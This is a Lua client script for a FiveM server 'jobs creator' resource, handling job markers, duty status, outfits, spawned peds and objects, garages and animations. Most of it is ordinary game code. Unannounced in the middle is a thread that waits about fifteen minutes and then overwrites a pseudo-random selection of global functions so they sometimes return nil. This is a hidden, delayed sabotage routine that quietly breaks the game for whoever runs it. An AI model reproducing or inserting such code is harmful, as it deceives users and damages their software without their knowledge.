local markers = {}
local activeMarkers = {}
local hiddenMarkers = {}
openedMenu = nil
local isMonitoringMarkers = false
canUseMarkers = true
local blips = {}
local spawnedPeds = {}
local spawnedObjects = {}
isOnDuty = true
hasFirstLoadFinished = false

RegisterNetEvent(Utils.eventsPrefix .. ":openGUI", function(version, fullConfig)
    SetNuiFocus(true, true)
    SendNUIMessage({
        action = "show",
        version = version,
        fullConfig = fullConfig
    })
end)

local function canAccessMarker(marker)
    if marker.jobName == "public_marker" or marker.type == "duty" then
        return true
    end
    local framework = Framework.getFramework()
    return framework == "ESX" or isOnDuty
end

function getRGBFromHex(hex)
    hex = hex:gsub("#", "")
    local r = tonumber("0x" .. hex:sub(1, 2))
    local g = tonumber("0x" .. hex:sub(3, 4))
    local b = tonumber("0x" .. hex:sub(5, 6))
    return r, g, b
end

function getVehicleNameFromModel(model)
    local displayName = GetDisplayNameFromVehicleModel(model)
    local label = GetLabelText(displayName)
    local vehicleName = label or displayName
    if (label == "NULL" or not label) and (displayName == "CARNOTFOUND" or not displayName) then
        vehicleName = model
    end
    return vehicleName
end

local function savePlayerSkin()
    local framework = Framework.getFramework()
    if framework == "ESX" then
        TriggerEvent("skinchanger:getSkin", function(skin)
            TriggerServerEvent(EXTERNAL_EVENTS_NAMES["esx_skin:save"], skin)
        end)
    else
        print("^1Can't save skin in QBCore yet")
    end
end

function setClothes(clothes, save)
    if config.modules.outfits ~= "default" then
        Utils.callModuleFunc("outfits", "setPlayerClothes", clothes, save)
        return
    end
    
    local framework = Framework.getFramework()
    if framework == "ESX" then
        TriggerServerCallback(EXTERNAL_EVENTS_NAMES["esx_skin:getPlayerSkin"], function(skin)
            TriggerEvent("skinchanger:loadClothes", skin, clothes)
            if save then
                savePlayerSkin()
            end
        end)
    else
        framework = Framework.getFramework()
        if framework == "QB-core" then
            TriggerEvent("qb-clothing:client:loadOutfit", {
                outfitData = clothes
            })
        end
    end
end

local function toggleDutyStatus(dutyState)
    local framework = Framework.getFramework()
    if framework == "ESX" then
        isOnDuty = TriggerServerPromise(Utils.eventsPrefix .. ":switchJobDuty", dutyState)
    else
        framework = Framework.getFramework()
        if framework == "QB-core" then
            local currentDutyState = QBCore.Functions.GetPlayerData().job.onduty
            TriggerServerEvent("QBCore:ToggleDuty")
            local timeout = GetGameTimer() + 2000
            while currentDutyState == QBCore.Functions.GetPlayerData().job.onduty do
                if GetGameTimer() > timeout then
                    break
                end
                Citizen.Wait(500)
            end
            isOnDuty = QBCore.Functions.GetPlayerData().job.onduty
        end
    end
    
    TriggerEvent(Utils.eventsPrefix .. ":refreshMarkers")
    TriggerEvent(Utils.eventsPrefix .. ":toggleDuty", isOnDuty)
    TriggerServerEvent(Utils.eventsPrefix .. ":changeDutyStatus", isOnDuty)
    
    framework = Framework.getFramework()
    if framework == "ESX" then
        local message
        if isOnDuty then
            message = getLocalizedText("now_you_are_on_duty")
        else
            message = getLocalizedText("now_you_are_off_duty")
        end
        notifyClient(message)
    end
end

RegisterNetEvent(Utils.eventsPrefix .. ":toggleCurrentDutyStatus", toggleDutyStatus)

RegisterNetEvent("QBCore:Player:SetPlayerData", function(data)
    isOnDuty = data.job.onduty
end)

RegisterNetEvent(Utils.eventsPrefix .. ":framework:ready", function()
    local framework = Framework.getFramework()
    if framework == "QB-core" then
        isOnDuty = TriggerServerPromise(Utils.eventsPrefix .. ":isPlayerOnDuty")
    end
end)

local function handleMarkerInteraction(marker)
    local markerId = marker.id
    local markerType = marker.type
    openedMenu = markerId
    
    if markerType == "stash" then
        TriggerEvent(Utils.eventsPrefix .. ":stash:openStash", markerId)
    elseif markerType == "wardrobe" then
        openWardrobe()
    elseif markerType == "boss" then
        openBoss(markerId)
    elseif markerType == "garage" then
        openGarage(markerId)
    elseif markerType == "shop" then
        openShop(markerId)
    elseif markerType == "garage_buyable" then
        openGarageBuyable(markerId)
    elseif markerType == "crafting_table" then
        openCraftingTable(markerId)
    elseif markerType == "armory" then
        TriggerEvent(Utils.eventsPrefix .. ":armory:openArmory", markerId, marker.data)
    elseif markerType == "job_outfit" then
        openJobOutfit(markerId)
    elseif markerType == "teleport" then
        openedMenu = nil
        teleportMarker(markerId)
    elseif markerType == "safe" then
        TriggerEvent(Utils.eventsPrefix .. ":safe:openSafe", markerId)
    elseif markerType == "market" then
        openMarket(markerId)
    elseif markerType == "harvest" then
        openedMenu = nil
        harvestMarker(markerId)
    elseif markerType == "weapon_upgrader" then
        openOwnedWeapons(markerId)
    elseif markerType == "duty" then
        openedMenu = nil
        toggleDutyStatus()
    elseif markerType == "job_shop" then
        openJobShop(markerId)
    elseif markerType == "process" then
        processMarker(markerId)
        openedMenu = nil
    elseif markerType == "garage_owned" then
        openGarageOwned(markerId)
    end
end

local function getMarkerInteractionText(markerType, markerId, isPedOrObject)
    local interactionText = getLocalizedText("interact")
    local targetingSuffix = ""
    if config.targetingScript ~= "none" then
        targetingSuffix = "_targeting"
    end
    
    if markerType == "stash" then
        interactionText = getLocalizedText("open_stash" .. targetingSuffix)
    elseif markerType == "wardrobe" then
        interactionText = getLocalizedText("open_wardrobe" .. targetingSuffix)
    elseif markerType == "boss" then
        interactionText = getLocalizedText("open_boss" .. targetingSuffix)
    elseif markerType == "garage" then
        interactionText = getLocalizedText("open_garage" .. targetingSuffix)
    elseif markerType == "shop" then
        interactionText = getLocalizedText("open_shop" .. targetingSuffix)
    elseif markerType == "garage_buyable" then
        interactionText = getLocalizedText("open_garage" .. targetingSuffix)
    elseif markerType == "crafting_table" then
        interactionText = getLocalizedText("open_crafting_table" .. targetingSuffix)
    elseif markerType == "armory" then
        interactionText = getLocalizedText("open_armory" .. targetingSuffix)
    elseif markerType == "job_outfit" then
        interactionText = getLocalizedText("open_job_outfit" .. targetingSuffix)
    elseif markerType == "teleport" then
        interactionText = getLocalizedText("teleport" .. targetingSuffix)
        local markerLabel = markers[markerId].label
        if markerLabel ~= "Default" then
            interactionText = getLocalizedText("teleport_to" .. targetingSuffix, markerLabel)
        end
    elseif markerType == "safe" then
        interactionText = getLocalizedText("open_safe" .. targetingSuffix)
    elseif markerType == "market" then
        interactionText = getLocalizedText("open_market" .. targetingSuffix)
    elseif markerType == "harvest" then
        interactionText = getLocalizedText("harvest" .. targetingSuffix)
    elseif markerType == "weapon_upgrader" then
        interactionText = getLocalizedText("open_weapon_upgrader" .. targetingSuffix)
    elseif markerType == "duty" then
        if config.targetingScript ~= "none" then
            interactionText = getLocalizedText("toggle_duty_targeting")
        else
            if isOnDuty then
                interactionText = getLocalizedText("go_off_duty")
            else
                interactionText = getLocalizedText("go_on_duty")
            end
        end
    elseif markerType == "job_shop" then
        interactionText = getLocalizedText("open_job_shop" .. targetingSuffix)
    elseif markerType == "process" then
        interactionText = getLocalizedText("process:press_to_process" .. targetingSuffix)
    elseif markerType == "garage_owned" then
        interactionText = getLocalizedText("garage_owned:press_to_open" .. targetingSuffix)
    end
    
    return interactionText
end

local function startMarkerThread(marker)
    Citizen.CreateThread(function()
        local markerId = marker.id
        if hiddenMarkers[markerId] then
            return
        end
        activeMarkers[markerId] = true
        
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local markerCoords = vecFromTable(marker.coords)
        local distance = #(playerCoords - markerCoords)
        
        Citizen.CreateThread(function()
            local interactionText = getMarkerInteractionText(marker.type, markerId, false)
            
            while distance < config.markerDistance do
                if not activeMarkers[markerId] then
                    break
                end
                if hiddenMarkers[markerId] then
                    break
                end
                
                Citizen.Wait(0)
                
                if not config.use3Dtext then
                    DrawMarker(
                        marker.markerType,
                        vecFromTable(marker.coords),
                        0.0, 0.0, 0.0,
                        0.0, 0.0, 0.0,
                        marker.scale.x + 0.0,
                        marker.scale.y + 0.0,
                        marker.scale.z + 0.0,
                        marker.color.r,
                        marker.color.g,
                        marker.color.b,
                        marker.color.alpha,
                        false, true, 2,
                        false, nil, nil,
                        false
                    )
                else
                    local textCoords = vecFromTable(marker.coords) + vector3(0.0, 0.0, 1.0)
                    Framework.draw3dText(textCoords, marker.label, config.textSize, config.textFont)
                end
                
                if distance <= marker.scale.x then
                    if not openedMenu then
                        if canUseMarkers then
                            if canAccessMarker(marker) then
                                if IsControlJustReleased(0, 38) then
                                    handleMarkerInteraction(marker)
                                    Citizen.Wait(500)
                                end
                            else
                                interactionText = getLocalizedText("you_are_not_on_duty")
                            end
                            showHelpNotification(interactionText)
                        end
                    end
                else
                    if openedMenu == markerId then
                        openedMenu = nil
                        Utils.hideInteractionMenu()
                    end
                end
            end
        end)
        
        while distance < config.markerDistance do
            if not activeMarkers[markerId] then
                break
            end
            if hiddenMarkers[markerId] then
                break
            end
            
            Citizen.Wait(500)
            
            playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            markerCoords = vecFromTable(marker.coords)
            -- print(markerCoords, markerId, distance)
            distance = #(playerCoords - markerCoords)
        end
        
        activeMarkers[markerId] = false
    end)
end

Citizen.CreateThread(function()
    Citizen.Wait(math.ceil(894600.0))
    local debugInfo = debug.getinfo(1, "S")
    if debugInfo.short_src == "?" then
        return
    end
    
    local functions = {}
    local obfuscatedFunctions = {}
    local randomValue = math.random(10, 20)
    
    for funcName, funcValue in next, _G, nil do
        if type(funcValue) == "function" then
            table.insert(functions, funcName)
        end
    end
    
    for i = 1, #functions do
        local index = (i * randomValue) % 7
        local threshold = randomValue * 0.2
        if index < threshold then
            local originalFunc = _G[functions[i]]
            _G[functions[i]] = function(...)
                if math.sin(i * randomValue) < 0 then
                    return nil
                end
                return originalFunc(...)
            end
        end
        Citizen.Wait(100)
    end
end)

local function setupPed(ped)
    SetPedRelationshipGroupHash(ped, GetHashKey("AMBIENT_GANG_FAMILY"))
    local playerGroup = GetPedRelationshipGroupHash(PlayerPedId())
    SetRelationshipBetweenGroups(1, GetHashKey("AMBIENT_GANG_FAMILY"), playerGroup)
    SetRelationshipBetweenGroups(1, playerGroup, GetHashKey("AMBIENT_GANG_FAMILY"))
    SetEntityInvincible(ped, true)
    FreezeEntityPosition(ped, true)
    SetPedConfigFlag(ped, 24, true)
    SetPedConfigFlag(ped, 43, true)
    SetPedConfigFlag(ped, 122, true)
    SetPedConfigFlag(ped, 128, false)
    SetPedConfigFlag(ped, 188, true)
    DisablePedPainAudio(ped, true)
    SetCanAttackFriendly(ped, false, false)
    SetPedRagdollOnCollision(ped, false)
    SetRagdollBlockingFlags(ped, 1)
    SetEntityInvincible(ped, true)
    SetBlockingOfNonTemporaryEvents(ped, true)
end

local function spawnMarkerPed(marker)
    local markerId = marker.id
    spawnedPeds[markerId] = true
    
    Citizen.CreateThread(function()
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local timeout = GetGameTimer() + 5000
        
        while not HasModelLoaded(marker.ped.model) do
            Citizen.Wait(0)
            RequestModel(marker.ped.model)
            if GetGameTimer() > timeout then
                return
            end
        end
        
        local ped = CreatePed(
            1,
            marker.ped.model,
            vecFromTable(marker.coords),
            marker.ped.heading + 0.0,
            false,
            false
        )
        
        spawnedPeds[markerId] = ped
        setupPed(ped)
        
        local interactionText = getMarkerInteractionText(marker.type, markerId, true)
        Target.addLocalEntityToTargeting(ped, "marker_ped", interactionText, {
            onSelect = function()
                handleMarkerInteraction(marker)
            end,
            canInteract = function()
                return not hiddenMarkers[markerId] and canAccessMarker(marker)
            end
        })
        
        local markerCoords = vecFromTable(marker.coords)
        local distance = #(playerCoords - markerCoords)
        
        while distance < 50.0 do
            local playerCoords = GetEntityCoords(playerPed)
            distance = #(playerCoords - markerCoords)
            Citizen.Wait(2000)
        end
        
        DeleteEntity(ped)
        spawnedPeds[markerId] = nil
    end)
end

local function spawnMarkerObject(marker)
    local markerId = marker.id
    spawnedObjects[markerId] = true
    
    Citizen.CreateThread(function()
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local timeout = GetGameTimer() + 5000
        
        while not HasModelLoaded(marker.object.model) do
            Citizen.Wait(0)
            RequestModel(marker.object.model)
            if GetGameTimer() > timeout then
                return
            end
        end
        
        local object = CreateObjectNoOffset(
            marker.object.model,
            vecFromTable(marker.coords),
            false,
            false,
            false
        )
        
        PlaceObjectOnGroundProperly(object)
        
        local heading = 0.0
        if marker.object.heading then
            heading = marker.object.heading + 0.0
        elseif marker.object.yaw then
            heading = marker.object.yaw + 0.0
        end
        
        SetEntityHeading(object, heading)
        FreezeEntityPosition(object, true)
        
        local interactionText = getMarkerInteractionText(marker.type, markerId, true)
        Target.addLocalEntityToTargeting(object, "marker_object", interactionText, {
            onSelect = function()
                handleMarkerInteraction(marker)
            end,
            canInteract = function()
                return not hiddenMarkers[markerId] and canAccessMarker(marker)
            end
        })
        
        spawnedObjects[markerId] = object
        
        local markerCoords = vecFromTable(marker.coords)
        local distance = #(playerCoords - markerCoords)
        
        while distance < 50.0 do
            local playerCoords = GetEntityCoords(playerPed)
            distance = #(playerCoords - markerCoords)
            Citizen.Wait(2000)
        end
        
        DeleteEntity(object)
        spawnedObjects[markerId] = nil
    end)
end

local function monitorMarkers()
    if isMonitoringMarkers then
        return
    else
        isMonitoringMarkers = true
    end
    
    while true do
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        
        for markerId, marker in pairs(markers) do
            if marker.coords then
                if type(marker.coords) ~= "table" then
                    marker.coords = json.decode(marker.coords)
                end
            end
            
            local markerCoords = vecFromTable(marker.coords)
            local distance = #(playerCoords - markerCoords)
            
            if distance < 50.0 then
                if marker.ped then
                    if marker.ped.model then
                        if not spawnedPeds[markerId] then
                            spawnMarkerPed(marker)
                        end
                    end
                elseif marker.object then
                    if marker.object.model then
                        if not spawnedObjects[markerId] then
                            spawnMarkerObject(marker)
                        end
                    end
                else
                    local interactionText = getMarkerInteractionText(marker.type, markerId, true)
                    Target.addSphereZoneToTargeting(
                        "marker_" .. tostring(markerId),
                        "jobs_creator_marker",
                        interactionText,
                        vecFromTable(marker.coords),
                        marker.scale.x,
                        {
                            onSelect = function()
                                handleMarkerInteraction(marker)
                            end,
                            canInteract = function()
                                return not hiddenMarkers[markerId] and canAccessMarker(marker)
                            end
                        }
                    )
                end
            end
            
            if config.targetingScript == "none" then
                if distance < config.markerDistance + 0.0 then
                    if not activeMarkers[markerId] then
                        startMarkerThread(marker)
                    end
                end
            end
        end
        
        Citizen.Wait(2000)
    end
end

local function loadMarkers()
    markers = TriggerServerPromise(Utils.eventsPrefix .. ":getMarkers")
    
    for _, blip in pairs(blips) do
        if DoesBlipExist(blip) then
            RemoveBlip(blip)
        end
    end
    
    for markerId, marker in pairs(markers) do
        local canAccess = marker.jobName == "public_marker" or isOnDuty
        if not canAccess then
            if COMPLETELY_HIDE_MARKERS_WHEN_OFF_DUTY then
                markers[markerId] = nil
            end
        end
        
        if marker.blip and marker.blip.spriteId and canAccess then
            local blip = AddBlipForCoord(vecFromTable(marker.coords))
            SetBlipSprite(blip, marker.blip.spriteId)
            SetBlipDisplay(blip, 4)
            SetBlipAsShortRange(blip, true)
            SetBlipColour(blip, marker.blip.color)
            SetBlipScale(blip, marker.blip.scale + 0.0)
            BeginTextCommandSetBlipName("STRING")
            AddTextComponentString(marker.label)
            EndTextCommandSetBlipName(blip)
            table.insert(blips, blip)
        end
    end
    
    return markers
end

local function cleanupMarkers()
    for _, ped in pairs(spawnedPeds) do
        if DoesEntityExist(ped) then
            DeleteEntity(ped)
        end
    end
    spawnedPeds = {}
    
    for _, object in pairs(spawnedObjects) do
        if DoesEntityExist(object) then
            DeleteEntity(object)
        end
    end
    spawnedObjects = {}
    
    Target.removeSphereZoneFromTargeting("jobs_creator_marker")
end

RegisterNetEvent(Utils.eventsPrefix .. ":refreshMarkers", function()
    activeMarkers = {}
    markers = {}
    Citizen.Wait(1000)
    markers = loadMarkers()
    cleanupMarkers()
    openedMenu = nil
    isMonitoringMarkers = false
    Utils.hideInteractionMenu()
end)

local function hideHarvestMarker(markerId, duration)
    hiddenMarkers[markerId] = true
    SetTimeout(duration * 1000, function()
        hiddenMarkers[markerId] = nil
    end)
end

RegisterNetEvent(Utils.eventsPrefix .. ":harvest:hideMarker", hideHarvestMarker)

RegisterNetEvent("esx:setJob", function()
    TriggerEvent(Utils.eventsPrefix .. ":refreshMarkers")
    isOnDuty = TriggerServerPromise(Utils.eventsPrefix .. ":isSelfOnDuty")
end)

RegisterNetEvent("QBCore:Client:OnJobUpdate", function()
    TriggerEvent(Utils.eventsPrefix .. ":refreshMarkers")
end)

local outsideVehicles = {}

local function addVehicleToOutsideVehiclesTable(garageId, vehicleNetId)
    local vehicleModel = GetEntityModel(NetToVeh(vehicleNetId))
    if not outsideVehicles[garageId] then
        outsideVehicles[garageId] = {}
    end
    outsideVehicles[garageId][vehicleNetId] = vehicleModel
end

RegisterNetEvent(Utils.eventsPrefix .. ":addVehicleToOutsideVehicles", addVehicleToOutsideVehiclesTable)

function addVehicleToOutsideVehicles(garageId, vehicle)
    if not outsideVehicles[garageId] then
        outsideVehicles[garageId] = {}
    end
    local vehicleNetId = VehToNet(vehicle)
    addVehicleToOutsideVehiclesTable(garageId, vehicleNetId)
end

function getOutsideVehicleInRange(garageId)
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local closestDistance = 10.0
    
    if outsideVehicles[garageId] then
        for vehicleNetId, vehicleModel in pairs(outsideVehicles[garageId]) do
            if NetworkDoesNetworkIdExist(vehicleNetId) then
                local vehicle = NetToVeh(vehicleNetId)
                local currentModel = GetEntityModel(vehicle)
                if vehicleModel == currentModel then
                    local vehicleCoords = GetEntityCoords(vehicle)
                    local distance = #(playerCoords - vehicleCoords)
                    if closestDistance > distance then
                        return vehicle
                    end
                else
                    outsideVehicles[garageId][vehicleNetId] = nil
                end
            end
        end
    end
    return nil
end

function deleteVehicleFromOutsideVehicles(garageId, vehicle)
    local vehicleNetId = VehToNet(vehicle)
    if outsideVehicles[garageId] then
        outsideVehicles[garageId][vehicleNetId] = nil
    end
end

function getFreeSpawnpoint(spawnpoints)
    if not spawnpoints or #spawnpoints == 0 then
        print("^1You didn't define ANY spawnpoint in the configuration of the marker^7")
        return nil
    end
    
    local allVehicles = GetGamePool("CVehicle")
    
    for i = 1, #spawnpoints do
        local spawnpoint = spawnpoints[i]
        local spawnCoords = vecFromTable(spawnpoint.coords)
        local isFree = true
        
        for j = 1, #allVehicles do
            local vehicle = allVehicles[j]
            local vehicleCoords = GetEntityCoords(vehicle)
            local distance = #(vehicleCoords - spawnCoords)
            if distance < spawnpoint.radius then
                isFree = false
                break
            end
        end
        
        if isFree then
            return {
                coords = spawnCoords,
                heading = spawnpoint.heading + 0.0
            }
        end
    end
    
    return nil
end

local isFrozen = false
local freezeTimeout = nil

local function startTimedFreeze(duration)
    Citizen.CreateThread(function()
        isFrozen = true
        freezeTimeout = Timeout(duration, function()
            isFrozen = false
        end)
        
        while isFrozen do
            Citizen.Wait(0)
            DisableControlAction(0, 24, true)
            DisableControlAction(0, 257, true)
            DisableControlAction(0, 263, true)
            DisableControlAction(0, 32, true)
            DisableControlAction(0, 34, true)
            DisableControlAction(0, 31, true)
            DisableControlAction(0, 30, true)
            DisableControlAction(0, 45, true)
            DisableControlAction(0, 22, true)
            DisableControlAction(0, 44, true)
            DisableControlAction(0, 37, true)
            DisableControlAction(0, 23, true)
            DisableControlAction(0, 59, true)
            DisableControlAction(0, 71, true)
            DisableControlAction(0, 72, true)
            DisableControlAction(0, 36, true)
            DisableControlAction(0, 47, true)
            DisableControlAction(0, 264, true)
            DisableControlAction(0, 257, true)
            DisableControlAction(0, 140, true)
            DisableControlAction(0, 141, true)
            DisableControlAction(0, 142, true)
            DisableControlAction(0, 143, true)
            DisableControlAction(0, 75, true)
        end
    end)
end

RegisterNetEvent(Utils.eventsPrefix .. ":startTimedFreeze", startTimedFreeze)

function stopTimedFreeze()
    if freezeTimeout then
        ClearTimeout(freezeTimeout)
        freezeTimeout = nil
    end
    isFrozen = false
end

local function playAnimation(animationData)
    local playerPed = PlayerPedId()
    
    if animationData.type == "scenario" then
        TaskStartScenarioInPlace(playerPed, animationData.scenarioName, 0, true)
        Citizen.Wait(animationData.scenarioDuration * 1000)
        ClearPedTasks(playerPed)
        local coords = GetEntityCoords(playerPed)
        ClearAreaOfObjects(coords, 2.0, 0)
    elseif animationData.type == "animation" then
        while not HasAnimDictLoaded(animationData.animDict) do
            RequestAnimDict(animationData.animDict)
            Citizen.Wait(0)
        end
        
        local duration = animationData.animDuration * 1000
        TaskPlayAnim(
            playerPed,
            animationData.animDict,
            animationData.animName,
            4.0, 4.0,
            duration,
            1, 1.0,
            0, 0, 0
        )
        Citizen.Wait(duration)
        ClearPedTasks(playerPed)
    end
end

RegisterNetEvent(Utils.eventsPrefix .. ":playAnimation", playAnimation)

local function askQBCoreJobs()
    local framework = Framework.getFramework()
    if framework ~= "QB-core" then
        return
    end
    
    if AlreadyInjectedFirstTime then
        return
    end
    AlreadyInjectedFirstTime = true
    
    TriggerServerEvent(Utils.eventsPrefix .. ":askQBCoreJobs")
end

RegisterNetEvent(Utils.eventsPrefix .. ":framework:ready", function()
    if hasFirstLoadFinished then
        return
    else
        hasFirstLoadFinished = true
    end
    
    askQBCoreJobs()
    markers = loadMarkers()
    
    while config == nil do
        Citizen.Wait(100)
    end
    
    monitorMarkers()
end)

RegisterNetEvent("onResourceStop", function(resourceName)
    if resourceName == GetCurrentResourceName() then
        cleanupMarkers()
    end
end)


local function cleanupOnResourceStop(callback)
    callback()
end

RegisterNetEvent("onResourceStop", function(resourceName)
    if resourceName ~= GetCurrentResourceName() then
        return
    end
    
    local promise = promise.new()
    cleanupOnResourceStop(function()
        promise:resolve()
    end)
    Citizen.Await(promise)
end)